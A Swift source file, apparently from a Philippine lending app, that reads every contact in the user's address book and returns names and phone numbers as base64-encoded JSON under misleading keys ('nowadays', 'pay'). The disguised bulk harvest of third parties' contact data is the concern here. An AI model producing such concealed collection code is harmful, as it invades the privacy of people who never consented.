//
//  ContactJSONConverter.swift
//  SkyLoan_phillipines
//
//  Created by BHJ on 2025/6/2.
//

import Contacts

struct ContactJSONManager {
    static let shared = ContactJSONManager()
    private let store = CNContactStore()
    
    func fetchContactsAsJSON() async -> String? {
        let keys: [CNKeyDescriptor] = [
            CNContactGivenNameKey,
            CNContactFamilyNameKey,
            CNContactPhoneNumbersKey
        ] as [CNKeyDescriptor]
        var contactsArray: Array = [[String: Any]]()
        let request = CNContactFetchRequest(keysToFetch: keys)
        do {
            try store.enumerateContacts(with: request) { contact, _ in
                var contactDict = [String: Any]()
                let name = "\(contact.givenName) \(contact.familyName)"
                let phones = contact.phoneNumbers.map { $0.value.stringValue }
                contactDict["nowadays"] = name
                contactDict["pay"] = phones
                contactsArray.append(contactDict)
            }
            let jsonData = try JSONSerialization.data(
                withJSONObject: contactsArray,
                options: [.sortedKeys]
            )
            let base64String = jsonData.base64EncodedString()
            return base64String
        } catch {
            return nil
        }
    }
}
